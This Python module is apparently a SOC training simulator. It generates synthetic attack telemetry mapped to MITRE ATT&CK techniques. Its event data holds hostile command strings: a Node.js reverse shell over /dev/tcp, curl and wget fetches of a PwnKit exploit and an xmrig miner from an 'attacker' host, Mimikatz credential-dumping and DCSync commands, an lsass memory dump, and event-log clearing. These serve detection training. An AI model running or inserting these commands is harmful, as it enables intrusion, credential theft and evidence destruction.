"""
CyberTwin SOC - Attack Scenario Engine
========================================
Loads scenario JSON files and generates the corresponding malicious events
with realistic timing, ordering, and MITRE ATT&CK metadata.

Supports technique-specific event generators for brute force, phishing,
lateral movement, exfiltration, credential dumping, and more.
"""

from __future__ import annotations

import json
import random
import uuid
from datetime import datetime, timedelta
from pathlib import Path
from typing import Any, Optional

PROJECT_ROOT = Path(__file__).resolve().parent.parent.parent

# Maps technique IDs to specialised generators
_BRUTE_FORCE_TECHNIQUES = {"T1110", "T1110.001", "T1110.002", "T1110.003", "T1110.004"}
_LATERAL_MOVE_TECHNIQUES = {"T1021", "T1021.001", "T1021.002", "T1021.004"}
_EXFIL_TECHNIQUES = {"T1048", "T1048.003", "T1567.002", "T1052.001", "T1041"}
_DISCOVERY_TECHNIQUES = {"T1083", "T1046", "T1087", "T1087.002", "T1018"}
_PERSISTENCE_TECHNIQUES = {"T1053", "T1053.003", "T1505.003"}
_CREDENTIAL_DUMPING_TECHNIQUES = {"T1003", "T1003.001", "T1003.006"}
_CREDENTIAL_MANIPULATION_TECHNIQUES = {"T1556", "T1556.006"}
_PRIV_ESCALATION_TECHNIQUES = {"T1068"}
_RESOURCE_HIJACKING_TECHNIQUES = {"T1496"}
_EXECUTION_TECHNIQUES = {"T1059", "T1059.001", "T1059.003"}


class AttackScenarioEngine:
    """Generates malicious event streams from scenario definitions.

    Loads attack scenario JSON files from disk and converts each scenario's
    phases into a chronologically ordered list of malicious events. Each
    MITRE ATT&CK technique has a dedicated event generator that produces
    realistic telemetry (e.g., brute-force login attempts, phishing emails,
    lateral SSH connections, data exfiltration transfers).
    """

    def __init__(self, scenarios_dir: Optional[Path] = None, seed: Optional[int] = None):
        """Initialize the engine.

        Args:
            scenarios_dir: Directory containing scenario JSON files. Defaults to PROJECT_ROOT/scenarios.
            seed: Random seed for reproducible event generation.
        """
        self._scenarios_dir = scenarios_dir or PROJECT_ROOT / "scenarios"
        self._rng = random.Random(seed)
        self._scenarios: dict[str, dict] = {}

    # ------------------------------------------------------------------
    # Loading
    # ------------------------------------------------------------------

    def load_scenarios(self) -> list[str]:
        """Load all scenario JSON files from the scenarios directory.

        Returns:
            List of loaded scenario IDs.
        """
        ids = []
        for path in sorted(self._scenarios_dir.glob("**/*.json")):
            with open(path, "r", encoding="utf-8") as fh:
                data = json.load(fh)
            sid = data.get("id", path.stem)
            self._scenarios[sid] = data
            ids.append(sid)
        return ids

    def get_scenario(self, scenario_id: str) -> dict | None:
        """Return the full scenario dict for the given ID, or None if not found."""
        return self._scenarios.get(scenario_id)

    def list_scenarios(self) -> list[dict[str, Any]]:
        """Return a summary list of all loaded scenarios."""
        return [
            {
                "id": s.get("id", sid),
                "name": s.get("name", ""),
                "description": s.get("description", ""),
                "severity": s.get("severity", ""),
                "category": s.get("category", ""),
                "phases": len(s.get("phases", [])),
                "mitre_techniques": s.get("mitre_techniques_summary", []),
            }
            for sid, s in self._scenarios.items()
        ]

    # ------------------------------------------------------------------
    # Event generation
    # ------------------------------------------------------------------

    def generate_attack_events(
        self,
        scenario_id: str,
        start_time: Optional[datetime] = None,
    ) -> list[dict[str, Any]]:
        """Generate all malicious events for a given attack scenario.

        Args:
            scenario_id: Identifier of the scenario to execute.
            start_time: Base timestamp for the first event.

        Returns:
            Chronologically sorted list of malicious event dicts.

        Raises:
            ValueError: If scenario_id is not found.
        """
        scenario = self._scenarios.get(scenario_id)
        if scenario is None:
            raise ValueError(f"Unknown scenario: {scenario_id}")

        start = start_time or datetime.now()
        events: list[dict[str, Any]] = []
        current_time = start

        for phase in scenario.get("phases", []):
            delay = phase.get("delay_seconds", 0)
            current_time += timedelta(seconds=delay)
            phase_events = self._generate_phase_events(phase, scenario, current_time)
            events.extend(phase_events)
            if phase_events:
                last_ts = max(e["timestamp"] for e in phase_events)
                try:
                    current_time = datetime.fromisoformat(last_ts)
                except (ValueError, TypeError):
                    pass

        events.sort(key=lambda e: e["timestamp"])
        return events

    # ------------------------------------------------------------------
    # Phase → events
    # ------------------------------------------------------------------

    def _generate_phase_events(
        self, phase: dict, scenario: dict, base_time: datetime,
    ) -> list[dict[str, Any]]:
        """Generate events for a single attack phase based on its MITRE technique.

        Args:
            phase: Phase definition from the scenario JSON.
            scenario: Parent scenario dict for context (ID, metadata).
            base_time: Starting timestamp for this phase's events.

        Returns:
            List of event dicts for this phase.
        """
        technique = phase.get("technique_id", "")
        indicators = phase.get("indicators", {})
        scenario_id = scenario.get("id", "")
        target_host = phase.get("target_host", "")
        target_user = phase.get("target_user", "")
        src_ip = indicators.get("source_ip", indicators.get("external_ip", "203.0.113.50"))

        common = {
            "is_malicious": True,
            "technique_id": technique,
            "scenario_id": scenario_id,
            "phase": phase.get("phase", 0),
            "phase_name": phase.get("name", ""),
            "tactic": phase.get("tactic", ""),
        }

        events: list[dict[str, Any]] = []

        # --- Brute Force: generate many failed logins + 1 success --------
        if technique in _BRUTE_FORCE_TECHNIQUES:
            n_failures = indicators.get("total_attempts", 25)
            for i in range(n_failures):
                ts = base_time + timedelta(seconds=i * self._rng.uniform(0.5, 3))
                events.append({
                    **common,
                    "timestamp": ts.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "authentication",
                    "success": False,
                    "src_host": target_host,
                    "src_ip": src_ip,
                    "dst_host": target_host,
                    "dst_ip": "",
                    "user": self._rng.choice(["root", "admin", "deploy", target_user or "admin"]),
                    "auth_method": indicators.get("protocol", "SSH").upper(),
                    "description": f"Failed SSH login attempt #{i+1} from {src_ip}",
                })

            # One successful login after the failures
            ts = base_time + timedelta(seconds=n_failures * 2 + 5)
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "authentication",
                "success": True,
                "src_host": target_host,
                "src_ip": src_ip,
                "dst_host": target_host,
                "dst_ip": "",
                "user": target_user or "deploy",
                "auth_method": "SSH",
                "description": f"Successful SSH login from {src_ip} after brute force",
            })

        # --- Port Scan: many network events to different ports -----------
        elif technique == "T1046":
            ports = [22, 80, 443, 445, 3306, 3389, 5432, 8080, 8443, 21, 25, 53, 110, 143, 993, 995]
            for i, port in enumerate(ports):
                ts = base_time + timedelta(seconds=i * 0.3)
                events.append({
                    **common,
                    "timestamp": ts.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "firewall",
                    "src_host": "",
                    "src_ip": src_ip,
                    "dst_host": target_host,
                    "dst_ip": indicators.get("target_ip", "10.0.1.10"),
                    "user": "",
                    "action": "DENY" if self._rng.random() < 0.7 else "ALLOW",
                    "dst_port": port,
                    "protocol": "TCP",
                    "description": f"Port scan: SYN to port {port}",
                })

        # --- Phishing / Email -------------------------------------------
        elif technique in ("T1566", "T1566.001", "T1566.002"):
            ts = base_time
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "email",
                "src_host": "MAIL-GW-01",
                "src_ip": src_ip,
                "dst_host": target_host,
                "user": target_user,
                "sender": indicators.get("sender", "attacker@phishing.com"),
                "recipient": f"{target_user}@corp.local",
                "subject": indicators.get("subject", "Urgent: Action Required"),
                "has_attachment": True,
                "description": f"Phishing email to {target_user}",
            })
            # DNS query for phishing domain
            domain = indicators.get("domain", "phishing.xyz")
            ts2 = ts + timedelta(seconds=30)
            events.append({
                **common,
                "timestamp": ts2.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "dns",
                "src_host": target_host,
                "src_ip": "",
                "user": target_user,
                "domain": domain,
                "query_type": "A",
                "description": f"DNS lookup for phishing domain {domain}",
            })
            # Web click
            url = indicators.get("url", f"https://{domain}/login")
            ts3 = ts + timedelta(seconds=45)
            events.append({
                **common,
                "timestamp": ts3.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "web_access",
                "src_host": target_host,
                "src_ip": "",
                "user": target_user,
                "url": url,
                "method": "POST",
                "description": f"User submitted credentials to {url}",
            })

        # --- Valid Accounts (credential use) ----------------------------
        elif technique in ("T1078", "T1078.002", "T1078.003"):
            ts = base_time
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "authentication",
                "success": True,
                "src_host": target_host,
                "src_ip": src_ip,
                "dst_host": phase.get("target_host", "srv-ad-01"),
                "user": target_user,
                "auth_method": "Kerberos",
                "description": f"Unusual login for {target_user} from external IP {src_ip}",
            })

        # --- Privilege Escalation (sudo, etc.) --------------------------
        elif technique in ("T1548", "T1548.003"):
            ts = base_time
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "process",
                "src_host": target_host,
                "src_ip": "",
                "user": target_user,
                "process_name": "sudo",
                "command_line": f"sudo su - root",
                "description": f"Privilege escalation: {target_user} used sudo to become root",
            })

        # --- Discovery ---------------------------------------------------
        elif technique in _DISCOVERY_TECHNIQUES:
            commands = indicators.get("commands", [
                "dir \\\\srv-db-01\\shared", "net view", "net user /domain",
                "ls -la /etc/", "cat /etc/passwd",
            ])
            for i, cmd in enumerate(commands):
                ts = base_time + timedelta(seconds=i * 8)
                events.append({
                    **common,
                    "timestamp": ts.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "process",
                    "src_host": target_host,
                    "src_ip": "",
                    "user": target_user,
                    "process_name": cmd.split()[0],
                    "command_line": cmd,
                    "description": f"Discovery: {cmd}",
                })

        # --- Lateral Movement (SSH) -------------------------------------
        elif technique in _LATERAL_MOVE_TECHNIQUES:
            ts = base_time
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "authentication",
                "success": True,
                "src_host": phase.get("source_host", target_host),
                "src_ip": indicators.get("source_internal_ip", indicators.get("source_ip", "10.0.1.100")),
                "dst_host": target_host,
                "user": target_user,
                "auth_method": "SSH",
                "description": f"Lateral movement: SSH from internal host to {target_host}",
            })
            # Network connection
            events.append({
                **common,
                "timestamp": (ts + timedelta(seconds=2)).isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "network",
                "src_host": phase.get("source_host", target_host),
                "src_ip": indicators.get("source_internal_ip", indicators.get("source_ip", "10.0.1.100")),
                "dst_host": target_host,
                "dst_ip": indicators.get("target_ip", "10.0.1.20"),
                "dst_port": 22,
                "protocol": "TCP",
                "user": target_user,
                "description": f"SSH connection for lateral movement to {target_host}",
            })

        # --- Data collection / staging ----------------------------------
        elif technique in ("T1005", "T1074.001"):
            files = indicators.get("files_accessed", [
                "/data/sensitive/employee_salaries.xlsx",
                "/data/sensitive/contracts_2024.pdf",
                "/data/sensitive/personal_data.csv",
            ])
            # If a copy tool is specified, generate a process event for it
            copy_tool = indicators.get("copy_tool", "")
            if copy_tool:
                events.append({
                    **common,
                    "timestamp": base_time.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "process",
                    "src_host": target_host,
                    "src_ip": "",
                    "user": target_user,
                    "process_name": copy_tool.split()[0],
                    "command_line": copy_tool,
                    "description": f"Bulk file copy: {copy_tool}",
                })
            for i, f in enumerate(files):
                ts = base_time + timedelta(seconds=2 + i * 5)
                events.append({
                    **common,
                    "timestamp": ts.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "file_access",
                    "src_host": target_host,
                    "src_ip": "",
                    "user": target_user,
                    "action": "read",
                    "file_path": f,
                    "description": f"Sensitive file accessed: {f}",
                })

        # --- Data compression -------------------------------------------
        elif technique in ("T1560", "T1560.001"):
            ts = base_time
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "process",
                "src_host": target_host,
                "src_ip": "",
                "user": target_user,
                "process_name": "7z.exe",
                "command_line": f"7z a -p{self._rng.choice(['secret','P@ss'])} C:\\temp\\archive.7z C:\\staging\\*",
                "description": "Data compressed into password-protected archive",
            })

        # --- Exfiltration -----------------------------------------------
        elif technique in _EXFIL_TECHNIQUES:
            ts = base_time
            data_size_mb = indicators.get("data_size_mb",
                           indicators.get("upload_size_mb", 100))
            dst_ip = indicators.get("destination_ip",
                     indicators.get("destination",
                     indicators.get("external_ip",
                     indicators.get("c2_ip", "185.220.101.42"))))
            # Large outbound transfer
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "network",
                "src_host": target_host,
                "src_ip": "",
                "dst_host": "",
                "dst_ip": dst_ip,
                "dst_port": 443,
                "protocol": "TCP",
                "user": target_user,
                "description": f"Large outbound transfer: {data_size_mb}MB to {dst_ip}",
                "details": {"bytes_out": data_size_mb * 1024 * 1024, "bytes_sent": data_size_mb * 1024 * 1024},
            })
            # Firewall log
            events.append({
                **common,
                "timestamp": (ts + timedelta(seconds=1)).isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "firewall",
                "src_host": target_host,
                "src_ip": "",
                "dst_host": "",
                "dst_ip": dst_ip,
                "dst_port": 443,
                "protocol": "TCP",
                "action": "ALLOW",
                "user": "",
                "description": f"Firewall ALLOW: outbound to {dst_ip}:443 ({data_size_mb}MB)",
            })
            # USB exfiltration if technique is T1052.001
            if technique == "T1052.001":
                events.append({
                    **common,
                    "timestamp": (ts + timedelta(seconds=10)).isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "security",
                    "src_host": target_host,
                    "user": target_user,
                    "description": "USB storage device connected",
                    "tags": ["usb"],
                })
            # Cloud exfiltration events for T1567.002
            if technique == "T1567.002":
                cloud_dst = indicators.get("primary_destination", "drive.google.com")
                secondary = indicators.get("secondary_destination", "mega.nz")
                events.append({
                    **common,
                    "timestamp": (ts + timedelta(seconds=15)).isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "web_access",
                    "src_host": target_host,
                    "src_ip": "",
                    "user": target_user,
                    "url": f"https://{cloud_dst}/upload",
                    "method": "POST",
                    "description": f"Browser upload to personal cloud storage: {cloud_dst}",
                })
                events.append({
                    **common,
                    "timestamp": (ts + timedelta(seconds=30)).isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "web_access",
                    "src_host": target_host,
                    "src_ip": "",
                    "user": target_user,
                    "url": f"https://{secondary}/upload",
                    "method": "POST",
                    "description": f"Browser upload to secondary cloud storage: {secondary}",
                })
                # Email exfil
                email_addr = indicators.get("email_exfil", "")
                if email_addr and "protonmail" in email_addr:
                    events.append({
                        **common,
                        "timestamp": (ts + timedelta(seconds=45)).isoformat(),
                        "event_id": str(uuid.uuid4()),
                        "event_type": "email",
                        "src_host": target_host,
                        "user": target_user,
                        "sender": f"{target_user}@corp.local",
                        "recipient": email_addr,
                        "subject": "Backup files",
                        "has_attachment": True,
                        "description": f"Outbound email to personal ProtonMail with attachments: {email_addr}",
                    })
            # C2 exfiltration for T1041
            if technique == "T1041":
                c2_ip = indicators.get("c2_ip", dst_ip)
                events.append({
                    **common,
                    "timestamp": (ts + timedelta(seconds=20)).isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "network",
                    "src_host": target_host,
                    "src_ip": "",
                    "dst_host": "",
                    "dst_ip": c2_ip,
                    "dst_port": 443,
                    "protocol": "TCP",
                    "user": target_user,
                    "description": f"Sustained HTTPS beacon traffic to C2 {c2_ip} with increasing payload sizes",
                    "details": {"bytes_out": data_size_mb * 1024 * 1024, "bytes_sent": data_size_mb * 1024 * 1024},
                })

        # --- Persistence (cron/web shell) --------------------------------
        elif technique in _PERSISTENCE_TECHNIQUES:
            ts = base_time
            if technique == "T1505.003":
                events.append({
                    **common,
                    "timestamp": ts.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "web_access",
                    "src_host": target_host,
                    "user": target_user,
                    "url": "http://srv-web-01/uploads/shell.php?cmd=whoami",
                    "method": "GET",
                    "description": "Web shell access detected: shell.php?cmd=whoami",
                })
                events.append({
                    **common,
                    "timestamp": (ts + timedelta(seconds=3)).isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "process",
                    "src_host": target_host,
                    "user": "www-data",
                    "process_name": "php",
                    "command_line": "php /var/www/html/uploads/shell.php",
                    "description": "Web shell process execution: shell.php",
                })
            else:
                events.append({
                    **common,
                    "timestamp": ts.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "process",
                    "src_host": target_host,
                    "user": target_user,
                    "process_name": "crontab",
                    "command_line": "crontab -e",
                    "description": "Crontab modified for persistence",
                })

        # --- Cover Tracks (file deletion + anti-forensics) ----------------
        elif technique in ("T1070", "T1070.004"):
            # SDelete / secure wipe
            ts = base_time
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "process",
                "src_host": target_host,
                "user": target_user,
                "process_name": "sdelete64.exe",
                "command_line": "sdelete64.exe -p 3 -s C:\\Users\\staging\\",
                "description": "SDelete secure wipe tool execution on staging directory",
            })
            # Event log clearing
            events.append({
                **common,
                "timestamp": (ts + timedelta(seconds=5)).isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "process",
                "src_host": target_host,
                "user": target_user,
                "process_name": "wevtutil.exe",
                "command_line": "wevtutil cl Security",
                "description": "Windows Security Event Log cleared",
            })
            # Browser history clearing
            events.append({
                **common,
                "timestamp": (ts + timedelta(seconds=10)).isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "process",
                "src_host": target_host,
                "user": target_user,
                "process_name": "RunDll32.exe",
                "command_line": "RunDll32.exe InetCpl.cpl ClearMyTracksByProcess",
                "description": "Browser history and tracking data cleared via ClearMyTracksByProcess",
            })
            # File deletions
            for i in range(15):
                ts_del = base_time + timedelta(seconds=15 + i * 2)
                events.append({
                    **common,
                    "timestamp": ts_del.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "file_access",
                    "src_host": target_host,
                    "user": target_user,
                    "action": "delete",
                    "file_path": f"/tmp/staging/file_{i}.dat",
                    "description": f"File deleted: /tmp/staging/file_{i}.dat",
                })

        # --- SSH key theft -----------------------------------------------
        elif technique in ("T1552", "T1552.004"):
            ts = base_time
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "file_access",
                "src_host": target_host,
                "user": target_user,
                "action": "read",
                "file_path": f"/home/{target_user}/.ssh/id_rsa",
                "description": f"SSH private key accessed: /home/{target_user}/.ssh/id_rsa",
            })

        # --- Supply Chain ------------------------------------------------
        elif technique in ("T1195", "T1195.002"):
            ts = base_time
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "process",
                "src_host": target_host,
                "user": target_user,
                "process_name": "node",
                "command_line": f"node -e \"require('child_process').exec('bash -i >& /dev/tcp/10.0.0.99/4444 0>&1')\"",
                "description": "Suspicious Node.js execution from npm package",
            })

        # --- Credential Dumping (Mimikatz, DCSync) ----------------------
        elif technique in _CREDENTIAL_DUMPING_TECHNIQUES:
            ts = base_time
            if technique == "T1003.006":
                # DCSync attack
                events.append({
                    **common,
                    "timestamp": ts.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "process",
                    "src_host": target_host,
                    "src_ip": indicators.get("source_ip", "10.0.1.11"),
                    "user": target_user,
                    "process_name": "mimikatz.exe",
                    "command_line": "Invoke-Mimikatz -Command 'lsadump::dcsync /domain:cybertwin.local /all /csv'",
                    "description": "DCSync: directory replication request from non-DC source",
                })
                events.append({
                    **common,
                    "timestamp": (ts + timedelta(seconds=5)).isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "network",
                    "src_host": target_host,
                    "src_ip": indicators.get("source_ip", "10.0.1.11"),
                    "dst_host": "srv-ad-01",
                    "dst_ip": "10.0.1.10",
                    "dst_port": 445,
                    "protocol": "TCP",
                    "user": target_user,
                    "description": "MS-DRSR directory replication traffic from non-domain controller",
                })
                # Account creation for persistence
                events.append({
                    **common,
                    "timestamp": (ts + timedelta(seconds=15)).isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "security",
                    "src_host": "srv-ad-01",
                    "user": target_user,
                    "description": "New domain admin account created: svc_backup",
                    "tags": ["account_creation", "privilege_escalation"],
                })
            else:
                # Mimikatz / LSASS credential dumping
                events.append({
                    **common,
                    "timestamp": ts.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "process",
                    "src_host": target_host,
                    "src_ip": "",
                    "user": target_user,
                    "process_name": "mimikatz.exe",
                    "command_line": "Invoke-Mimikatz -Command 'sekurlsa::logonpasswords'",
                    "description": "Credential dumping: Mimikatz accessing LSASS memory",
                })
                events.append({
                    **common,
                    "timestamp": (ts + timedelta(seconds=3)).isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "process",
                    "src_host": target_host,
                    "src_ip": "",
                    "user": target_user,
                    "process_name": "lsass.exe",
                    "command_line": "procdump -ma lsass.exe lsass.dmp",
                    "description": "Process accessing lsass.exe memory for credential extraction",
                })

        # --- Credential Manipulation (MFA bypass, OAuth abuse) ----------
        elif technique in _CREDENTIAL_MANIPULATION_TECHNIQUES:
            ts = base_time
            events.append({
                **common,
                "timestamp": ts.isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "authentication",
                "success": True,
                "src_host": target_host,
                "src_ip": src_ip,
                "dst_host": "srv-ad-01",
                "user": target_user,
                "auth_method": "OAuth",
                "description": f"Suspicious OAuth consent grant from external IP {src_ip}",
            })
            events.append({
                **common,
                "timestamp": (ts + timedelta(seconds=5)).isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "web_access",
                "src_host": target_host,
                "src_ip": src_ip,
                "user": target_user,
                "url": f"https://{indicators.get('fake_portal', 'login-microsoftonline.cloud')}/oauth/consent",
                "method": "POST",
                "description": f"Credential harvesting via fake OAuth portal at {indicators.get('fake_portal', 'phishing.com')}",
            })

        # --- Privilege Escalation via Exploit (PwnKit, etc.) -----------
        elif technique in _PRIV_ESCALATION_TECHNIQUES:
            ts = base_time
            cmds = indicators.get("commands", [
                "curl -o /tmp/.pwnkit http://attacker/pwnkit.c",
                "gcc /tmp/.pwnkit -o /tmp/.pk",
                "/tmp/.pk",
            ])
            for i, cmd in enumerate(cmds):
                events.append({
                    **common,
                    "timestamp": (ts + timedelta(seconds=i * 5)).isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "process",
                    "src_host": target_host,
                    "src_ip": "",
                    "user": target_user,
                    "process_name": cmd.split()[0] if cmd.split() else "exploit",
                    "command_line": cmd,
                    "description": f"Privilege escalation exploit: {cmd}",
                })
            # UID change event
            events.append({
                **common,
                "timestamp": (ts + timedelta(seconds=len(cmds) * 5 + 2)).isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "security",
                "src_host": target_host,
                "user": target_user,
                "description": f"UID change from {target_user} to root via pkexec exploit",
                "tags": ["privilege_escalation", "exploit"],
            })

        # --- Resource Hijacking (Cryptominer) ---------------------------
        elif technique in _RESOURCE_HIJACKING_TECHNIQUES:
            ts = base_time
            cmds = indicators.get("commands", [
                "pg_dumpall -U postgres > /tmp/.db_backup.sql",
                "wget -q http://attacker/xmrig -O /usr/local/bin/.kworker",
                "/usr/local/bin/.kworker -o stratum+tcp://pool.minexmr.com:4444",
            ])
            for i, cmd in enumerate(cmds):
                events.append({
                    **common,
                    "timestamp": (ts + timedelta(seconds=i * 10)).isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "process",
                    "src_host": target_host,
                    "src_ip": "",
                    "user": target_user,
                    "process_name": cmd.split()[0] if cmd.split() else "miner",
                    "command_line": cmd,
                    "description": f"Resource hijacking: {cmd}",
                })
            # Mining pool network connection
            events.append({
                **common,
                "timestamp": (ts + timedelta(seconds=len(cmds) * 10 + 5)).isoformat(),
                "event_id": str(uuid.uuid4()),
                "event_type": "network",
                "src_host": target_host,
                "src_ip": "",
                "dst_host": indicators.get("mining_pool", "pool.minexmr.com"),
                "dst_ip": "45.77.182.100",
                "dst_port": 4444,
                "protocol": "TCP",
                "user": target_user,
                "description": f"Stratum mining protocol connection to {indicators.get('mining_pool', 'pool.minexmr.com')}",
            })

        # --- Execution (Command Shell, PowerShell) ----------------------
        elif technique in _EXECUTION_TECHNIQUES:
            ts = base_time
            expected = phase.get("expected_logs", [])
            if expected:
                for i, log_spec in enumerate(expected):
                    t = ts + timedelta(seconds=i * 5)
                    etype = log_spec.get("type", "process")
                    events.append({
                        **common,
                        "timestamp": t.isoformat(),
                        "event_id": str(uuid.uuid4()),
                        "event_type": etype,
                        "src_host": target_host,
                        "src_ip": src_ip,
                        "user": target_user,
                        "process_name": "rundll32.exe",
                        "command_line": "rundll32.exe NativeZone.dll,DllMain",
                        "description": log_spec.get("description", phase.get("description", "")),
                    })
            else:
                events.append({
                    **common,
                    "timestamp": ts.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": "process",
                    "src_host": target_host,
                    "src_ip": src_ip,
                    "user": target_user,
                    "process_name": "cmd.exe",
                    "command_line": "cmd.exe /c whoami && net user",
                    "description": f"Command execution: {phase.get('description', '')}",
                })

        # --- Generic fallback -------------------------------------------
        else:
            expected_logs = phase.get("expected_logs", [{"type": "security", "description": phase.get("description", "")}])
            for i, log_spec in enumerate(expected_logs):
                ts = base_time + timedelta(seconds=i * 5)
                events.append({
                    **common,
                    "timestamp": ts.isoformat(),
                    "event_id": str(uuid.uuid4()),
                    "event_type": log_spec.get("type", "security"),
                    "src_host": target_host,
                    "src_ip": src_ip,
                    "dst_host": target_host,
                    "user": target_user,
                    "description": log_spec.get("description", phase.get("description", "")),
                })

        return events
